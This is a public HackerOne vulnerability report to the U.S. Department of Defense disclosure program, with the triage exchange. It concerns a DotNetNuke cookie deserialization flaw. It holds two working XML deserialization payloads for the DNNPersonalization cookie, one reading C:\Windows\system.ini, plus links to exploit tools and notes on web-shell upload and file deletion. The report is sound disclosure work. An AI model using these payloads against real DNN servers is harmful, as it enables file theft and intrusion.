{"id":876708,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NzY3MDg=","url":"https://hackerone.com/reports/876708","title":"Remote Code Execution through DNN Cookie Deserialization ","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2020-05-17T20:13:54.706Z","submitted_at":"2020-05-17T20:13:54.706Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"droop3r","url":"/droop3r","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/NXyokUaESNi8gKmJqYK5Uam9/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":16064,"url":"https://hackerone.com/deptofdefense","handle":"deptofdefense","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"U.S. Dept Of Defense","twitter_handle":"DC3VDP","website":"https://bit.ly/2Rt5QhM","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-05-27T14:06:11.705Z","bug_reporter_agreed_on_going_public_at":"2020-05-26T15:18:31.636Z","team_member_agreed_on_going_public_at":"2020-05-27T14:06:11.636Z","comments_closed?":true,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:**\nThe application at ```https://████████``` presents a deserialization vulnerability that permits RCE and file read/write\n\n## Step-by-step Reproduction Instructions\n\n1. Navigate to a random page that must return a 404 Error status like ```https://████/test```\n2. Add this cookie in the request header: ```DNNPersonalization```\n3. Insert the payload into the ```DNNPersonalization``` cookie. You can generate a payload with the following tool https://github.com/pwntester/ysoserial.net, using the DotNetNuke plugin, or use the official exploit from here: https://www.exploit-db.com/exploits/48336, or use the following payload to read a file from the system:\n\n```\n\u003cprofile\u003e\n\u003citem key=\"name1:key1\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=█████████]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=███████\"\u003e\u003cExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\u003e\n\u003cExpandedElement/\u003e\n\u003cProjectedProperty0\u003e\n\u003cMethodName\u003eWriteFile\u003c/MethodName\u003e\n\u003cMethodParameters\u003e\n\u003canyType xsi:type=\"xsd:string\"\u003etest\u003c/anyType\u003e\n\u003c/MethodParameters\u003e\n\u003cObjectInstance xsi:type=\"FileSystemUtils\"\u003e\u003c/ObjectInstance\u003e\n\u003c/ProjectedProperty0\u003e\n\u003c/ExpandedWrapperOfFileSystemUtilsObjectDataProvider\u003e\n\u003c/item\u003e\n\u003c/profile\u003e\n```\n\nWhere ```test``` is the wanted file\n\nExpected result:\n████\n\n\n## Product, Version, and Configuration (If applicable)\nPlatform: https://████████/shell.aspx\nVulnerable Product: DotNetNuke\nVulnerable Version: \u003c 9.3.0-RC\n\n\n## Suggested Mitigation/Remediation Actions\nUpdate the DotNetNuke (DNN) product to the latest version or to a more recent version that is not vulnerable\n\n## Impact\n\nAn attacker can execute remote commands on the system and gain unauthorized access to it.","weakness":{"id":59,"name":"OS Command Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":55,"voters":["th3hidd3nmist","nytr0gen","brahim_boufakri01","0xelkomy","droop3r","dastan_9408","zeop","h4zuel","xxiad","tr1xx0r","and 45 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8028582,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Greetings from the Department of Defense (DoD),\n\nThank you for supporting the DoD Vulnerability Disclosure Program (VDP).\n\nBy submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.\n\nThe VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.\n\nWe will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.\n\nOur goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.\n\nRegards,\n\nThe VDP Team","automated_response":true,"created_at":"2020-05-17T20:13:55.311Z","updated_at":"2020-05-17T20:13:55.311Z","actor":{"url":"/deptofdefense","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"U.S. Dept Of Defense"}},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8035632,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"@droop3r can you provide more information on this? .rb doesnt appear to work right off in msfconsole and I did not have any luck w/any of the other tries.\n1. do you have the ysoserial payload?\n2. can you show this actually working by running a command such as whoami or reading a file that is not publicly available (like boot.ini)?\n\nThanks!","automated_response":false,"created_at":"2020-05-18T13:39:08.615Z","updated_at":"2020-05-18T13:41:10.004Z","actor":{"username":"agent-l8","cleared":false,"url":"/agent-l8","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8035876,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi,\n\nYou can read, for example the ```C:\\Windows\\system.ini``` file (which is not publicly available) through the following payload:\n\n```\n\u003cprofile\u003e\n\u003citem key=\"name1:key1\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=█████]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=███████\"\u003e\u003cExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\u003e\n\u003cExpandedElement/\u003e\n\u003cProjectedProperty0\u003e\n\u003cMethodName\u003eWriteFile\u003c/MethodName\u003e\n\u003cMethodParameters\u003e\n\u003canyType xsi:type=\"xsd:string\"\u003eC:\\Windows\\system.ini\u003c/anyType\u003e\n\u003c/MethodParameters\u003e\n\u003cObjectInstance xsi:type=\"FileSystemUtils\"\u003e\u003c/ObjectInstance\u003e\n\u003c/ProjectedProperty0\u003e\n\u003c/ExpandedWrapperOfFileSystemUtilsObjectDataProvider\u003e\n\u003c/item\u003e\n\u003c/profile\u003e\n```\n\nAnd here it is the result:\n███████\n","automated_response":false,"created_at":"2020-05-18T13:52:56.277Z","updated_at":"2020-05-27T13:12:22.528Z","actor":{"username":"droop3r","cleared":false,"url":"/droop3r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NXyokUaESNi8gKmJqYK5Uam9/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8037792,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-05-18T15:26:27.231Z","updated_at":"2020-05-18T15:26:27.231Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":725311},"actor":{"username":"agent-r5","cleared":false,"url":"/agent-r5","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8037794,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Greetings,\n\nWe have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.\n\nThank you for bringing this vulnerability to our attention!\n\nWe will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.\n\nYou will receive another status update after we have confirmed your report has been resolved by the system owner. If you have any questions, please let me know.\n\nThanks again for supporting the DoD Vulnerability Disclosure Program.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2020-05-18T15:26:28.684Z","updated_at":"2020-05-18T15:26:28.684Z","actor":{"username":"agent-r5","cleared":false,"url":"/agent-r5","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8037816,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"So far we do not see the RCE just ability to get to file system. If you provide proof of rce (maybe call cmd.exe to run whoami) we will raise severity appropriately. ","automated_response":false,"created_at":"2020-05-18T15:28:30.530Z","updated_at":"2020-05-18T15:28:30.530Z","actor":{"username":"agent-r5","cleared":false,"url":"/agent-r5","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8039738,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"There is the possibility to write files on the system too, which can result into an ASPX Web Shell upload, but for that you must have knowledge about a complete path with write permissions, like the installation folder of the web application. You can brute force the paths using the file read payloads as it will be reflected through the application if there does not exist or if you do not have enough privileges for it.","automated_response":false,"created_at":"2020-05-18T17:47:27.402Z","updated_at":"2020-05-18T17:47:27.402Z","actor":{"username":"droop3r","cleared":false,"url":"/droop3r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NXyokUaESNi8gKmJqYK5Uam9/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8066258,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The application throws a 403 error status when trying to parse a RCE payload, that's mostly probable the WAF is triggered when a client is trying to send such payloads using ```ObjectStateFormatter```","automated_response":false,"created_at":"2020-05-21T06:30:35.624Z","updated_at":"2020-05-21T06:30:35.624Z","actor":{"username":"droop3r","cleared":false,"url":"/droop3r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NXyokUaESNi8gKmJqYK5Uam9/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8081865,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"@droop3r \n\nHello,  \n\nWhere you able to retry the following payload ObjectStateFormatter?","automated_response":false,"created_at":"2020-05-22T17:23:35.156Z","updated_at":"2020-05-22T17:23:35.156Z","actor":{"username":"agentt2","cleared":false,"url":"/agentt2","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8091156,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi,\n\nNo, and I am not anymore able to test it as the system seems patched.\n\nThanks,\n██████████","automated_response":false,"created_at":"2020-05-24T13:35:33.020Z","updated_at":"2020-05-27T13:14:02.981Z","actor":{"username":"droop3r","cleared":false,"url":"/droop3r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NXyokUaESNi8gKmJqYK5Uam9/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8091221,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"As a recap of the issue, the application was vulnerable to payloads based on only ``DotNetNuke.*`` classes. \n\nThe ``Deserialize`` method belonging to  ``ObjectStateFormatter`` requires a Base64 encoded payload to be parsed through its string argument, which was immediately caught by a Web Application Firewall or some detection mechanism, and it didn't allow the payload to be sent through the ``DNNPersonalization`` cookie.\n\nThe vulnerability was demonstrated by pulling the ``C:\\Windows\\system.ini`` file through the ``WriteFile`` method of the ``DotNetNuke.Common.Utilities.FileSystemUtils`` class. (XML Payload)\n\nBesides reading arbitrary files, an attacker could use other methods of the ``DotNetNuke.Common.Utilities.FileSystemUtils`` class to perform other actions, for example:\n\n- Upload file (requires permissions and full local path), through the ``CreateFileFromString`` method\n- Delete file (requires permissions and full local path), through the ``DeleteFile`` method\n- Delete folders (requires permissions and full local path), through the ``DeleteFolderRecursive`` method\n\nA list full of methods can be found here: https://dnndocs.com/api/DotNetNuke.html , some of them may be or may not be working, as the documentation relates to the latest version, and we are testing against an old version of DNN.\n","automated_response":false,"created_at":"2020-05-24T14:03:37.423Z","updated_at":"2020-05-24T14:03:37.423Z","actor":{"username":"droop3r","cleared":false,"url":"/droop3r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NXyokUaESNi8gKmJqYK5Uam9/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8107875,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Good news!\n\nThe vulnerability you reported has been resolved and this report is now closed. If you have any further questions or disagree that the report is resolved, please let us know.\n\nThank you for your time and effort to improve the security of the DoD information network.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2020-05-26T14:53:47.337Z","updated_at":"2020-05-26T14:53:47.337Z","actor":{"username":"agent-r5","cleared":false,"url":"/agent-r5","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"droop3r","url":"/droop3r"},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8108099,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Can we please disclose this one?","automated_response":false,"created_at":"2020-05-26T15:18:31.652Z","updated_at":"2020-05-26T15:18:31.652Z","first_to_agree":true,"actor":{"username":"droop3r","cleared":false,"url":"/droop3r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NXyokUaESNi8gKmJqYK5Uam9/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8119424,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-05-27T14:06:11.656Z","updated_at":"2020-05-27T14:06:11.656Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8119425,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-05-27T14:06:11.726Z","updated_at":"2020-05-27T14:06:11.726Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8119428,"is_internal":false,"editable":false,"type":"Activities::CommentsClosed","message":"Thanks for participating in the DoD Vulnerability Disclosure Program. We're publicly disclosing your resolved report at this time.  We also lock the report on the disclosure but feel free to reach out to us at VDP-Questions@dc3.mil if there are any questions, concerns or issues.","automated_response":false,"created_at":"2020-05-27T14:06:38.700Z","updated_at":"2020-05-27T14:06:38.700Z","actor":{"url":"/deptofdefense","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"U.S. Dept Of Defense"}},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}